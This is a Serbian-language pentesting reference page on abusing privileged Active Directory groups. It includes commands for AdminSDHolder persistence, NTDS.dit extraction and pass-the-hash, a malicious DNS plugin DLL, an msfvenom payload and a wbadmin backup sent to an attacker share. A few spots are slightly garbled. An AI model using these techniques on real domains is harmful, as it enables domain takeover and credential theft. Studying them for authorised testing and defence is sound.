# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## Poznate grupe sa administratorskim privilegijama

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ova grupa može da kreira naloge i grupe koji nemaju administratorska prava na domenu. Pored toga, omogućava lokalno prijavljivanje na Domain Controller (DC).

Da biste utvrdili članove ove grupe, izvršava se sledeća komanda:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Dodavanje novih korisnika je dozvoljeno, kao i lokalno prijavljivanje na DC.<sup>[[1]](#references)</sup>

Uslovna putanja od upravljanja nalozima do pristupa lokalnog administratora jeste **obična grupa kojoj je delegovano pravo čitanja LAPS lozinke računara**. Proverite efektivna prava za upis članstva u toj konkretnoj grupi, da li je zaštićena i da li novi nalog ili nalog pod vašom kontrolom zaista može da joj se pridruži. Osvežite token naloga pre testiranja dozvole za čitanje LAPS-a na ciljnom računaru. Kod šifrovanog Windows LAPS-a, dozvola za čitanje iz direktorijuma i ovlašćenje za dešifrovanje lozinke predstavljaju zasebne zahteve; samo članstvo u grupi ili članstvo u Account Operators ne obezbeđuje nijedno od njih. Pogledajte [Microsoft's Account Operators scope](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) и [Windows LAPS delegation](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## AdminSDHolder grupa

Lista kontrole pristupa (ACL) grupe **AdminSDHolder** je ključna jer određuje dozvole za sve „zaštićene grupe“ u Active Directory-ju, uključujući grupe sa visokim privilegijama. Ovaj mehanizam obezbeđuje sigurnost tih grupa sprečavanjem neovlašćenih izmena.

Napadač bi ovo mogao da iskoristi izmenom ACL-a grupe **AdminSDHolder** i dodelom punih dozvola standardnom korisniku. Time bi taj korisnik dobio potpunu kontrolu nad svim zaštićenim grupama. Ako se dozvole tog korisnika izmene ili uklone, sistem će ih automatski vratiti u roku od sat vremena.<sup>[[14]](#references)</sup>

Novija dokumentacija za Windows Server i dalje označava nekoliko ugrađenih operatorskih grupa kao **zaštićene** objekte (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` itd.). Proces **SDProp** se podrazumevano pokreće na **PDC Emulator** svakih 60 minuta, postavlja `adminCount=1` i onemogućava nasleđivanje na zaštićenim objektima. Ovo je korisno kako za održavanje postojanosti tako i za otkrivanje zastarelih privilegovanih korisnika koji su uklonjeni iz zaštićene grupe, ali i dalje imaju ACL bez nasleđivanja.<sup>[[12]](#references)</sup>

Komande za pregled članova i izmenu dozvola uključuju:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Dostupan je skript za ubrzavanje procesa vraćanja: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Za više detalja posetite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Vidljivost obrisanih objekata određuju efektivne dozvole direktorijuma; samo ime grupe ne dokazuje da trenutni identitet može da izlista ili vrati objekat. AD Recycle Bin mora biti omogućen pre brisanja da bi bilo moguće potpuno vraćanje, a za vraćanje su potrebni i Reanimate-Tombstones na korenu naming context-a, dozvole za preimenovanje i CREATE_CHILD na odredišnom kontejneru. [Microsoft-ova uputstva za Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) i [pravila autorizacije za poništavanje brisanja](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) razlikuju ove uslove. Identitet sa ovlašćenim pristupom za čitanje obrisanih objekata može da pregleda zapise koji mogu otkriti osetljive informacije:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Ovo je korisno za **otkrivanje prethodnih putanja do privilegija**. Izbrisani objekti i dalje mogu da otkriju `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, stare SPN-ove ili DN izbrisane privilegovane grupe koju drugi operator kasnije može da vrati.

Atributi koje definiše aplikacija mogu da zadrže i stari materijal za autentifikaciju dok je objekat u izbrisanom stanju. Tretirajte ovo kao zaseban pravac za proveru: trenutni identitet mora da ima dozvolu da izlista izbrisani objekat **i** da pročita taj atribut, vrednost mora da bude upotrebljiva akreditivna informacija, a aktivni principal mora da je prihvati. Članstvo u grupi ili samo ime izbrisanog naloga ne dokazuju nijedan od ovih koraka; izbegavajte ispisivanje vrednosti akreditivnih informacija tokom rutinskog izlistavanja. [Microsoftova dokumentacija o korpi za otpatke](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) opisuje očuvanje atributa nakon brisanja.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Domain Controller Access

Pristup datotekama na DC-u je ograničen, osim ako je korisnik član grupe `Server Operators`, što menja nivo pristupa.

### Privilege Escalation

Pomoću alata `PsService` ili `sc` iz paketa Sysinternals mogu se pregledati i izmeniti dozvole servisa. Grupa `Server Operators`, na primer, ima potpunu kontrolu nad određenim servisima, što omogućava izvršavanje proizvoljnih komandi i eskalaciju privilegija:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Ova komanda otkriva da `Server Operators` imaju pun pristup, što im omogućava da manipulišu servisima radi sticanja povišenih privilegija.

## Backup Operators

Članstvo u grupi `Backup Operators` može da dodeli privilegije `SeBackupPrivilege` i `SeRestorePrivilege` na hostu, u zavisnosti od lokalnih smernica i sesije prijavljivanja. Proverite **efektivni token procesa koji izvršava komande** pomoću `whoami /groups` i `whoami /priv`: samo članstvo u grupi ne potvrđuje da je `SeBackupPrivilege` prisutan i omogućen. Ako je privilegija prisutna, ali onemogućena, može se omogućiti u tom tokenu; ako nedostaje ili je uklonjena, ove operacije pravljenja rezervnih kopija ne mogu da je koriste. `SeBackupPrivilege` omogućava zaštićena **čitanja** preko API-ja koji podržavaju semantiku pravljenja rezervnih kopija (na primer, `FILE_FLAG_BACKUP_SEMANTICS` ili `robocopy /B`); `SeRestorePrivilege` je zasebna privilegija za operacije vraćanja iz rezervne kopije i upisivanja. Uobičajeni prikazi sadržaja direktorijuma i kopiranja ne koriste nužno semantiku pravljenja rezervnih kopija.<sup>[[1]](#references)</sup>

Da biste izlistali članove grupe, izvršite:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Lokalni napad

Na hostu na kom efektivni token ima `SeBackupPrivilege`, sledeće kopiranje koje podržava backup može da pročita zaštićenu datoteku:

1. Uvezite neophodne biblioteke:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Ako je privilegija prisutna, ali onemogućena, omogućite je i proverite njeno stanje u ovom procesu:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Kopirajte datoteku iz ograničenog direktorijuma, na primer:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD napad

`NTDS.dit` je Active Directory baza podataka na **domain controller (DC)**. Ovaj postupak zahteva odgovarajući token na DC-u i pristup volumenu koji sadrži bazu podataka; članstvo u grupi Backup Operators na drugom mestu ne daje pristup određenom DC-u. Aktivna baza podataka je obično zaključana, pa pre kopiranja koristite dostupnu shadow copy ili drugo backup rešenje. Kreiranje ili izlaganje shadow copy takođe zavisi od VSS konfiguracije hosta i prava pozivaoca. Primer u nastavku pretpostavlja da DC čuva `NTDS.dit` na `C:` putanji `\Windows\NTDS`; prilagodite volumen i putanju ako to nije slučaj.

#### Korišćenje diskshadow.exe

1. Ako je dozvoljeno, napravite i izložite shadow copy diska `C:` na DC-u kao `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Kopirajte `NTDS.dit` iz shadow copy-ja:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternativno, koristite `robocopy` za kopiranje datoteka:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Sačuvajte DC-ov `SYSTEM` hive za offline izdvajanje. `SAM` je baza lokalnih naloga na članskim sistemima; `SAM` hive na DC-u nije zamena za `NTDS.dit` niti izvor hash-a domain Administrator naloga:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Prenesite `ntds.dit` i `SYSTEM.SAV` na host za analizu i izdvojte hash-eve naloga domena. Sačuvani `SAM` hive sa članskog sistema, uz odgovarajući `SYSTEM` hive, daje hash-eve lokalnih naloga:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Ako je hash **Administratora domena** oporavljen iz `NTDS.dit`, može se testirati za autentifikaciju na domenu. Hash lokalnog Administratora iz `SAM.SAV` je drugi akreditiv i ne omogućava autentifikaciju kao Administrator domena.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Korišćenje wbadmin.exe

1. Podesite NTFS datotečni sistem za SMB server na napadačkoj mašini i keširajte SMB akreditive na ciljnoj mašini.
2. Upotrebite `wbadmin.exe` za pravljenje rezervne kopije sistema i izdvajanje datoteke `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Za praktičan prikaz pogledajte [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Članovi grupe **DnsAdmins** mogu da iskoriste svoje privilegije za učitavanje proizvoljnog DLL-a sa SYSTEM privilegijama na DNS serveru, koji je često hostovan na kontrolerima domena. Ova mogućnost pruža značajan potencijal za eksploataciju.

Da biste izlistali članove grupe DnsAdmins, upotrebite:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Izvršavanje proizvoljnog DLL-a (CVE‑2021‑40469)

> [!NOTE]
> Ova ranjivost omogućava izvršavanje proizvoljnog koda sa SYSTEM privilegijama u DNS servisu (obično unutar DC-ova). Ovaj problem je otklonjen 2021. godine.

Članovi mogu da navedu DNS server da učita proizvoljan DLL (lokalno ili sa udaljenog deljenog resursa) pomoću komandi kao što su:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Potrebno je ponovo pokrenuti DNS servis (što može zahtevati dodatne dozvole) da bi se DLL učitao:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Za više detalja o ovom vektoru napada pogledajte ired.team.

#### Mimilib.dll

Moguće je koristiti i mimilib.dll za izvršavanje komandi, tako što ćete ga izmeniti da izvršava određene komande ili pokreće reverse shell-ove. [Pogledajte ovu objavu](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) za više informacija.<sup>[[15]](#references)</sup>

### WPAD zapis za MitM

DnsAdmins mogu da manipulišu DNS zapisima i izvode Man-in-the-Middle (MitM) napade tako što će kreirati WPAD zapis nakon što onemoguće globalnu listu blokiranih upita. Alatke kao što su Responder ili Inveigh mogu da se koriste za lažiranje i hvatanje mrežnog saobraćaja.

### Čitaoci evidencije događaja
Članovi mogu da pristupaju evidencijama događaja i potencijalno pronađu osetljive informacije, kao što su lozinke u čistom tekstu ili detalji o izvršavanju komandi:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Ova grupa može da menja DACL-ove na objektu domena, čime potencijalno dodeljuje DCSync privilegije. Tehnike za eskalaciju privilegija koje iskorišćavaju ovu grupu detaljno su opisane u GitHub repozitorijumu Exchange-AD-Privesc.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Ako možete da delujete kao član ove grupe, klasična zloupotreba je dodeliti prava replikacije potrebna za [DCSync](dcsync.md) principalu pod kontrolom napadača:

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Istorijski, **PrivExchange** je povezivao pristup poštanskom sandučetu, iznuđenu Exchange autentifikaciju i LDAP relay da bi omogućio pristup ovom istom primitivu. Čak i kada je taj relay put ublažen, direktno članstvo u grupi `Exchange Windows Permissions` ili kontrola nad Exchange serverom i dalje predstavljaju veoma vredan put do prava za replikaciju domena.

## Hyper-V Administrators

Članovi grupe Hyper-V Administrators imaju pun pristup Hyper-V-u, što se može iskoristiti za preuzimanje kontrole nad virtuelizovanim kontrolerima domena. To uključuje kloniranje aktivnih DC-ova i izvlačenje NTLM hash-eva iz datoteke NTDS.dit.

### Primer eksploatacije

Praktična zloupotreba obično podrazumeva **pristup diskovima ili checkpoint-ima DC-a van mreže**, a ne stare LPE trikove na nivou hosta. Uz pristup Hyper-V hostu, operater može da napravi checkpoint ili izveze virtuelizovani kontroler domena, montira VHDX i izvuče `NTDS.dit`, `SYSTEM` i druge tajne bez pristupa LSASS-u unutar virtuelne mašine:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Odatle ponovo iskoristite workflow za `Backup Operators` da biste offline kopirali `Windows\NTDS\ntds.dit` i registry hive-ove. Povezani workflow za backup fajlove:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Ova grupa omogućava članovima da kreiraju Group Policy-je u domenu. Međutim, njeni članovi ne mogu da primenjuju group policy-je na korisnike ili grupe niti da uređuju postojeće GPO-ove.

Važna pojedinost je to što **kreator postaje vlasnik novog GPO-a** i obično dobija dovoljno prava da ga naknadno uređuje. To znači da je ova grupa zanimljiva kada možete da:

- kreirate zlonamerni GPO i ubedite admina da ga poveže sa ciljnim OU-om/domenom
- uredite GPO koji ste kreirali, a koji je već povezan na nekom korisnom mestu
- zloupotrebite drugo delegirano pravo koje vam omogućava povezivanje GPO-ova, dok vam ova grupa daje mogućnost uređivanja

Praktična zloupotreba obično podrazumeva dodavanje **Immediate Task-a**, **startup skripte**, **članstva u lokalnoj admin grupi** ili izmene **dodele korisničkih prava** kroz policy fajlove koje podržava SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Ako ručno uređujete GPO preko `SYSVOL`, imajte na umu da sama izmena nije dovoljna: potrebno je ažurirati i `versionNumber`, `GPT.ini`, a ponekad i `gPCMachineExtensionNames`, inače će klijenti ignorisati osvežavanje pravila.<sup>[[9]](#references)</sup>

## Organization Management

U okruženjima u kojima je implementiran **Microsoft Exchange**, posebna grupa pod nazivom **Organization Management** ima značajne mogućnosti. Ova grupa ima privilegiju da **pristupa poštanskim sandučićima svih korisnika domena** i ima **potpunu kontrolu nad** organizacionom jedinicom (OU) **'Microsoft Exchange Security Groups'**. Ova kontrola obuhvata i grupu **`Exchange Windows Permissions`**, koja se može iskoristiti za privilege escalation.

### Iskorišćavanje privilegija i komande

#### Print Operators

Članovi grupe **Print Operators** imaju nekoliko privilegija, uključujući **`SeLoadDriverPrivilege`**, koja im omogućava da se **lokalno prijave na Domain Controller**, isključe ga i upravljaju štampačima. Da bi se ove privilegije iskoristile, naročito ako **`SeLoadDriverPrivilege`** nije vidljiva u kontekstu bez povišenih privilegija, neophodno je zaobići User Account Control (UAC).<sup>[[1]](#references)</sup>

Za prikaz članova ove grupe koristi se sledeća PowerShell komanda:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Na Domain Controllers, ova grupa je opasna jer podrazumevana Domain Controller Policy dodeljuje **`SeLoadDriverPrivilege`** grupi `Print Operators`. Ako dobijete povišeni token za člana ove grupe, možete da omogućite ovu privilegiju i učitate potpisani, ali ranjivi driver da biste dobili pristup kernelu/SYSTEM-u.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Detalje o rukovanju tokenima potražite u odeljku [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Članovima ove grupe odobrava se pristup računarima putem Remote Desktop Protocol-a (RDP). Za nabrajanje članova dostupne su PowerShell komande:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Dodatni uvidi u eksploataciju RDP-a mogu se pronaći u namenskim pentesting resursima.

#### Remote Management Users

Članovi mogu da pristupaju računarima preko **Windows Remote Management (WinRM)**. Enumeracija članova se obavlja pomoću:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Za tehnike eksploatacije povezane sa **WinRM**, potrebno je konsultovati odgovarajuću dokumentaciju.

#### Server Operators

Ova grupa ima dozvole za obavljanje različitih konfiguracija na Domain Controllerima, uključujući privilegije za pravljenje rezervnih kopija i vraćanje podataka, menjanje sistemskog vremena i gašenje sistema.<sup>[[1]](#references)</sup> Za enumeraciju članova koristi se sledeća komanda:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Na kontrolerima domena, članovi grupe `Server Operators` često nasleđuju dovoljno prava da **ponovo konfigurišu ili pokreću/zaustavljaju servise**, a preko podrazumevane DC politike dobijaju i `SeBackupPrivilege`/`SeRestorePrivilege`. U praksi, to ih čini vezom između **zloupotrebe kontrole nad servisima** i **izvlačenja NTDS-a**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Nemogućnost izlistavanja servisa ne isključuje pristup **poznatom servisu**. Service Control Manager zasebno proverava `SC_MANAGER_ENUMERATE_SERVICE` za izlistavanje i `SC_MANAGER_CONNECT`; otvaranje imenovanog servisa proverava njegova zasebna prava, uključujući `SERVICE_CHANGE_CONFIG` i `SERVICE_START`. Proverite efektivni token i ACL tog servisa čak i kada opšta komanda `sc.exe query` ne uspe. Sama prava za konfigurisanje samo ukazuju na moguću priliku: identitet servisa, prava za pokretanje/zaustavljanje i upotrebljiv okidač i dalje određuju da li je moguć prelazak na viši nivo privilegija. Pogledajte [Microsoftovu referencu za prava pristupa servisima](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Ako ACL servisa ovoj grupi daje prava za izmenu/pokretanje, postavite proizvoljnu komandu kao putanju servisa, pokrenite ga kao `LocalSystem`, a zatim vratite prvobitni `binPath`. Ako je upravljanje servisima ograničeno, primenite prethodno navedene `Backup Operators` tehnike za kopiranje datoteke `NTDS.dit`.

## References

- [1] [ired.team – Privilegovani nalozi i Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Zloupotreba SeLoadDriverPrivilege za eskalaciju privilegija](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Zloupotreba GPO dozvola](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Zloupotreba GPO-a, 1. deo (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Vodič za red team operativce o GPO-ima i OU-ovima](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Funkcija ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonimni LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Dodatak C: Zaštićeni nalozi i grupe u Active Directory-ju](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Kako zloupotrebiti i postaviti backdoor u AdminSDHolder radi trajnog pristupa kao Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Zloupotreba privilegije DnsAdmins za eskalaciju u Active Directory-ju](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informacije o zloupotrebi ivice GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Funkcija NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
